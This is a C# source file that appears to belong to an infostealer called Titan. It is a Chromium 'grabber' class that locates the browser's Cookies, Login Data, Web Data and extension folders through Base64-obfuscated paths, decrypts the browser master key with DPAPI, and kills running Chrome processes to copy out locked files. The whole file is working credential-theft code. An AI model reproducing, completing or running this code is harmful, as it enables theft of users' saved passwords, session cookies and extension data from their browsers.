using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using Titan.NF.Client.Browsers.Contracts;

namespace Titan.NF.Client.Browsers.Grabbers
{
    internal class ChromiumV2Grabber : IBrowserGrabber
    {
        private string Subpath = "";
        private string LocalAppDataPath = "";

        public byte[] Cookie()
        {
            return Read(CombinePath(BrowserPath(), "VXNlciBEYXRhXFxEZWZhdWx0XFxOZXR3b3JrXFxDb29raWVz".FromBase64()));
        }

        public bool Detected()
            => Directory.Exists(BrowserPath());

        public Dictionary<string, string> Extensions()
        {
            var ls = CombinePath(BrowserPath(), "VXNlciBEYXRhXFxEZWZhdWx0XFxFeHRlbnNpb25z".FromBase64());
            Dictionary<string, string> results = new Dictionary<string, string>();

            foreach (var requiredExtension in BrowsersRegistry.ExtensionsMap)
            {
                string normalizedExtensionsPath = requiredExtension.Value;
                string currentExtensionDirectory = Path.Combine(ls, normalizedExtensionsPath);

                if (Directory.Exists(currentExtensionDirectory))
                {
                    results.Add(requiredExtension.Key.FromBase64(), currentExtensionDirectory);
                }
            }

            return results;
        }

        public void For(string sub)
        {
            Subpath = sub;
            LocalAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        }

        public byte[] LoginDatas()
        {
            return Read(CombinePath(BrowserPath(), "VXNlciBEYXRhXFxEZWZhdWx0XFxMb2dpbiBEYXRh".FromBase64()));
        }

        public byte[] MasterKey()
        {
            var ls = CombinePath(BrowserPath(), "VXNlciBEYXRhXFxMb2NhbCBTdGF0ZQ==".FromBase64());
            Console.WriteLine($"LOCAL STATE: {ls}");
            Console.WriteLine($"BROWSER PATH: {BrowserPath()}");

            if (!File.Exists(ls))
            {
                return Array.Empty<byte>();
            }

            var content = File.ReadAllText(ls);
            dynamic json = JsonConvert.DeserializeObject(content);

            if (json == null)
            {
                return Array.Empty<byte>();
            }

            string key = json.os_crypt.encrypted_key;
            byte[] binkey = Convert.FromBase64String(key).Skip(5).ToArray();
            return ProtectedData.Unprotect(binkey, null, DataProtectionScope.CurrentUser);
        }

        public string ProcessName() {
            return "Q2hyb21l".FromBase64();
        }

        public string Tag()
            => Subpath;

        public byte[] WebData()
        {
            return Read(CombinePath(BrowserPath(), "VXNlciBEYXRhXFxEZWZhdWx0XFxXZWIgRGF0YQ==".FromBase64()));
        }

        private byte[] Read(string ls)
        {
            Console.WriteLine($"Read from: {ls}");

            if (!File.Exists(ls))
            {
                return Array.Empty<byte>();
            }

            try
            {
                return File.ReadAllBytes(ls);
            }
            catch
            {
                Process.GetProcesses().Where(x => x.ProcessName.Contains(ProcessName())).ToList().ForEach(x => x.Kill());

                var tempPath = ls + "_tmp";
                File.Copy(ls, tempPath);
                var data = File.ReadAllBytes(tempPath);
                File.Delete(tempPath);

                return data;
            }
        }

        private string BrowserPath()
        {
            return Path.Combine(LocalAppDataPath, Subpath.Split(' ')[0], Subpath.Split(' ')[1]);
        }

        private string CombinePath(params string[] others)
        {
            return Path.Combine(others);
        }
    }
}
